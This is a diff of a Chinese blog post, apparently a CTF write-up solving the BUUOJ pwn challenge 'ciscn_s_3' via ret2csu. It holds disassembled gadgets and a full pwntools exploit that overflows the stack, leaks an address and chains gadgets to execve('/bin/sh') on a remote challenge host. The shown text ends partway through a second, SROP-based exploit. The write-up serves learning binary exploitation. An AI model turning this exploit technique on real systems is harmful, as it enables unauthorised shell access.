@@ -31,7 +31,7 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/liuliuliuzy.github.io\/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98\/"
-        },"genre": "posts","keywords": "CTF, pwn","wordcount":  3953 ,
+        },"genre": "posts","keywords": "CTF, pwn","wordcount":  3965 ,
         "url": "https:\/\/liuliuliuzy.github.io\/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98\/","datePublished": "2021-08-26T17:43:20+08:00","dateModified": "2021-08-27T00:00:00+00:00","publisher": {
             "@type": "Organization",
             "name": ""},"author": {
@@ -129,7 +129,7 @@
             <div class="post-meta-line">
                 <span class="post-author"><i class="author fas fa-user-circle fa-fw"></i><a href="https://github.com/liuliuliuzy" title="Author" target="_blank" rel="noopener noreffer author" class="author">zyleo</a>
                 </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-08-26">2021-08-26</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2021-08-27">2021-08-27</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 3953 字&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-08-26">2021-08-26</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2021-08-27">2021-08-27</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 3965 字&nbsp;
                 <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 8 分钟&nbsp;<span id="/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/" class="leancloud_visitors" data-flag-title="记录一道ret2csu的pwn题">
                         <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
                     </span>&nbsp;</div>
@@ -168,12 +168,12 @@
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">Arch:     amd64-64-little
-RELRO:    Partial RELRO
-Stack:    No canary found
-NX:       NX enabled
-PIE:      No PIE (0x400000)
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Arch:     amd64-64-little
+</span></span><span class="line"><span class="cl">RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">Stack:    No canary found
+</span></span><span class="line"><span class="cl">NX:       NX enabled
+</span></span><span class="line"><span class="cl">PIE:      No PIE (0x400000)
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>64位，没开PIE，没有cannary，开了NX（说明不能直接写shellcode）。</p>
 <p>IDA看一下，<code>vuln()</code>和<code>gadgets()</code>很显眼啊，<del>看着这函数名当时心想这估计又是一道简简单单的基础rop训练，且看我10分钟拿下🤣</del>那就分别去看一下这两个函数的内容吧。</p>
@@ -241,14 +241,14 @@ PIE:      No PIE (0x400000)
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">vuln_addr</span><span class="p">)</span>
-<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
-
-<span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span>
-
-<span class="n">stack_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
-<span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">stack_addr</span> <span class="o">-</span> <span class="mh">0x118</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">vuln_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">stack_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">stack_addr</span> <span class="o">-</span> <span class="mh">0x118</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>上面的<code>payload1</code>发完之后，又进入了<code>vuln()</code>。接下来的就是通过第二个payload想办法构造ROP链来实现控制寄存器与函数跳转的过程，这又是这题的一个难点（因为我做这题之前不知道ret2csu😶）。最简单的思路那肯定是用ROPgadget找到能够pop三个寄存器、然后ret的gadget。但是ROPgadget只能找到<code>pop rdi</code>和<code>pop rsi</code>的gadget（为什么<code>pop rsi; pop r15; ret</code>这条指令从中间开始取就是<code>pop rdi; ret</code>？这是指令设计的原因吗？），还差一个，所以这种方法行不通。</p>
 <p><figure><a class="lightgallery" href="/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210827152113322.png" title="image-20210827152113322" data-thumbnail="/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210827152113322.png" data-sub-html="<h2>&#39;pop rdx&#39; 找不到</h2><p>image-20210827152113322</p>">
@@ -276,16 +276,16 @@ PIE:      No PIE (0x400000)
 </span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">//mov
-.text:0000000000400580 loc_400580:                             ; CODE XREF: __libc_csu_init+54↓j
-.text:0000000000400580                 mov     rdx, r13
-.text:0000000000400583                 mov     rsi, r14
-.text:0000000000400586                 mov     edi, r15d
-.text:0000000000400589                 call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]
-.text:000000000040058D                 add     rbx, 1
-.text:0000000000400591                 cmp     rbx, rbp
-.text:0000000000400594                 jnz     short loc_400580
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">//mov
+</span></span><span class="line"><span class="cl">.text:0000000000400580 loc_400580:                             ; CODE XREF: __libc_csu_init+54↓j
+</span></span><span class="line"><span class="cl">.text:0000000000400580                 mov     rdx, r13
+</span></span><span class="line"><span class="cl">.text:0000000000400583                 mov     rsi, r14
+</span></span><span class="line"><span class="cl">.text:0000000000400586                 mov     edi, r15d
+</span></span><span class="line"><span class="cl">.text:0000000000400589                 call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]
+</span></span><span class="line"><span class="cl">.text:000000000040058D                 add     rbx, 1
+</span></span><span class="line"><span class="cl">.text:0000000000400591                 cmp     rbx, rbp
+</span></span><span class="line"><span class="cl">.text:0000000000400594                 jnz     short loc_400580
+</span></span></code></pre></td></tr></table>
 </div>
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -299,15 +299,15 @@ PIE:      No PIE (0x400000)
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">//pop
-.text:000000000040059A                 pop     rbx
-.text:000000000040059B                 pop     rbp
-.text:000000000040059C                 pop     r12
-.text:000000000040059E                 pop     r13
-.text:00000000004005A0                 pop     r14
-.text:00000000004005A2                 pop     r15
-.text:00000000004005A4                 retn
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">//pop
+</span></span><span class="line"><span class="cl">.text:000000000040059A                 pop     rbx
+</span></span><span class="line"><span class="cl">.text:000000000040059B                 pop     rbp
+</span></span><span class="line"><span class="cl">.text:000000000040059C                 pop     r12
+</span></span><span class="line"><span class="cl">.text:000000000040059E                 pop     r13
+</span></span><span class="line"><span class="cl">.text:00000000004005A0                 pop     r14
+</span></span><span class="line"><span class="cl">.text:00000000004005A2                 pop     r15
+</span></span><span class="line"><span class="cl">.text:00000000004005A4                 retn
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>总结下来就是：</p>
 <ul>
@@ -325,15 +325,15 @@ PIE:      No PIE (0x400000)
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rbx_rbp_r12_r13_r14_r15_ret</span><span class="p">)</span>
-<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh_addr</span><span class="o">+</span><span class="mh">0x50</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span>
-<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">mov_rax_59_ret</span><span class="p">)</span>
-<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rbx_rbp_r12_r13_r14_r15_ret</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh_addr</span><span class="o">+</span><span class="mh">0x50</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">mov_rax_59_ret</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>对应的执行流程为：</p>
 <ol>
-<li>写完'/bin/sh'，<code>vuln()</code>内执行<code>retn</code>，进而执行<code>pop_rbx_rbp_r12_r13_r14_r15_ret</code>。<code>pop</code>6次，<code>rbx</code>/<code>rbp</code>/<code>r12</code>/<code>r13</code>/<code>r14</code>/<code>r15</code>分别被设为<code>0</code>/<code>0</code>/<code>binsh_addr+0x50</code>/<code>0</code>/<code>0</code>/<code>0</code>/，<code>rsp</code>此时指向<code>mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12</code>，接在再<code>retn</code>，执行<code>mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12</code>，此时<code>rsp</code>指向<code>mov_rax_59_ret</code>，<strong>注意，这刚好是前面的<code>binsh_addr_0x50</code>😬</strong></li>
+<li>写完&rsquo;/bin/sh&rsquo;，<code>vuln()</code>内执行<code>retn</code>，进而执行<code>pop_rbx_rbp_r12_r13_r14_r15_ret</code>。<code>pop</code>6次，<code>rbx</code>/<code>rbp</code>/<code>r12</code>/<code>r13</code>/<code>r14</code>/<code>r15</code>分别被设为<code>0</code>/<code>0</code>/<code>binsh_addr+0x50</code>/<code>0</code>/<code>0</code>/<code>0</code>/，<code>rsp</code>此时指向<code>mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12</code>，接在再<code>retn</code>，执行<code>mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12</code>，此时<code>rsp</code>指向<code>mov_rax_59_ret</code>，<strong>注意，这刚好是前面的<code>binsh_addr_0x50</code>😬</strong></li>
 <li><code>mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12</code>指令执行，<code>rsi</code>/<code>rdx</code>被设置为0，第一次<code>call [r12];</code>。</li>
 <li>众所周知，<code>call</code>指令的执行过程是先push再jump，然后jump的目的指令段最后一般都有个ret回来。所以，第一次执行<code>call [r12];</code>，就相当于执行<code>mov_rax_59_ret</code>，把<code>rax</code>设为了<code>59</code>，然后<code>ret</code>。经过一番<code>push</code>/<code>ret</code>之后，<strong><code>rsp</code>又回到了<code>mov_rax_59_ret</code>的位置</strong>，但此时<code>rbx</code>已经被加了1，值变为了<code>1</code>。然后通过后面的<code>cmp</code>判断，<code>jnz</code>再次跳回<code>mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12</code>指令开头。</li>
 <li>再次执行<code>mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12</code>，不同的是，此时<code>rbx</code>为<code>1</code>，所以<code>call</code>指令变为了<code>call [r12+8];</code>，所以<code>pop_rdi_ret</code>被执行：<code>call</code>首先<code>push</code>，<code>rsp</code>指向<code>call</code>之后的下一条指令，然后<code>jump</code>；<code>jump</code>之后<code>pop rdi</code>，<code>rdi</code>变为了<code>call</code>的下一条指令地址，<code>rsp</code>指向<code>mov_rax_59_ret</code>；再接着<code>ret</code>，<code>rsp</code>指向<code>pop_rdi_ret</code>，<code>rip</code>指令寄存器的内容为<code>mov_rax_59_ret</code>，所以系统执行的下一条指令为<code>mov_rax_59_ret</code>。</li>
@@ -380,41 +380,41 @@ PIE:      No PIE (0x400000)
 </span><span class="lnt">34
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="err">；</span>
-<span class="c1"># 本地调试</span>
-<span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
-    <span class="c1"># context.terminal = [&#34;wsl&#34;, &#34;-c&#34;]</span>
-    <span class="c1"># io = process(&#34;./ciscn_s_3&#34;)</span>
-    <span class="n">io</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&#34;./ciscn_s_3&#34;</span><span class="p">)</span>
-<span class="k">else</span><span class="p">:</span>
-    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node4.buuoj.cn&#34;</span><span class="p">,</span> <span class="mi">25280</span><span class="p">)</span>
-    <span class="c1"># context.log_level = &#39;debug&#39;</span>
-
-<span class="n">vuln_addr</span> <span class="o">=</span> <span class="mh">0x4004ed</span>
-<span class="n">syscall</span> <span class="o">=</span> <span class="mh">0x400517</span>
-<span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x4005a3</span>
-<span class="n">mov_rax_59_ret</span> <span class="o">=</span> <span class="mh">0x4004e2</span>
-<span class="n">pop_rbx_rbp_r12_r13_r14_r15_ret</span> <span class="o">=</span> <span class="mh">0x40059a</span>
-<span class="n">mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12</span> <span class="o">=</span> <span class="mh">0x400580</span>
-
-<span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">vuln_addr</span><span class="p">)</span>
-<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
-
-<span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span>
-
-<span class="n">stack_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
-<span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">stack_addr</span> <span class="o">-</span> <span class="mh">0x118</span>
-<span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x38</span><span class="p">)</span>
-
-<span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rbx_rbp_r12_r13_r14_r15_ret</span><span class="p">)</span>
-<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh_addr</span><span class="o">+</span><span class="mh">0x50</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span>
-<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">mov_rax_59_ret</span><span class="p">)</span>
-<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>
-
-<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
-<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="err">；</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 本地调试</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># context.terminal = [&#34;wsl&#34;, &#34;-c&#34;]</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># io = process(&#34;./ciscn_s_3&#34;)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="s2">&#34;./ciscn_s_3&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;node4.buuoj.cn&#34;</span><span class="p">,</span> <span class="mi">25280</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># context.log_level = &#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">vuln_addr</span> <span class="o">=</span> <span class="mh">0x4004ed</span>
+</span></span><span class="line"><span class="cl"><span class="n">syscall</span> <span class="o">=</span> <span class="mh">0x400517</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x4005a3</span>
+</span></span><span class="line"><span class="cl"><span class="n">mov_rax_59_ret</span> <span class="o">=</span> <span class="mh">0x4004e2</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rbx_rbp_r12_r13_r14_r15_ret</span> <span class="o">=</span> <span class="mh">0x40059a</span>
+</span></span><span class="line"><span class="cl"><span class="n">mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12</span> <span class="o">=</span> <span class="mh">0x400580</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">vuln_addr</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">stack_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">stack_addr</span> <span class="o">-</span> <span class="mh">0x118</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x38</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rbx_rbp_r12_r13_r14_r15_ret</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh_addr</span><span class="o">+</span><span class="mh">0x50</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">mov_rdx_r13_mov_rsi_r14_mov_edi_r15_call_r12</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">mov_rax_59_ret</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p>执行截图</p>
 <p><figure><a class="lightgallery" href="/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210827162304078.png" title="image-20210827162304078" data-thumbnail="/2021-08-26-%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93ret2csu%E7%9A%84pwn%E9%A2%98/image-20210827162304078.png" data-sub-html="<h2>执行结果</h2><p>image-20210827162304078</p>">
@@ -458,32 +458,32 @@ PIE:      No PIE (0x400000)
 </span><span class="lnt">25
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
-<span class="n">p</span> <span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s1">&#39;node3.buuoj.cn&#39;</span><span class="p">,</span><span class="mi">26063</span><span class="p">)</span><span class="c1"># process(&#39;./ciscn_s_3&#39;) # </span>
-<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./ciscn_s_3&#39;</span><span class="p">)</span>
-<span class="n">mov_rax_15_ret</span> <span class="o">=</span> <span class="mh">0x4004da</span>
-<span class="n">vuln_addr</span> <span class="o">=</span> <span class="mh">0x4004ed</span>
-<span class="n">syscall_addr</span> <span class="o">=</span> <span class="mh">0x400517</span>
-<span class="n">payload1</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mh">0x10</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">vuln_addr</span><span class="p">)</span>
-
-
-<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
-<span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span>
-<span class="n">stack_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x118</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;stack addr: &#34;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">stack_leak</span><span class="p">))</span>
-
-<span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
-<span class="n">frame</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="mh">0x3b</span> <span class="c1"># syscall::execve, constants.SYS_execve is also ok</span>
-<span class="n">frame</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall_addr</span>
-<span class="n">frame</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">stack_leak</span>
-<span class="n">frame</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mi">0</span>
-<span class="n">frame</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mi">0</span>
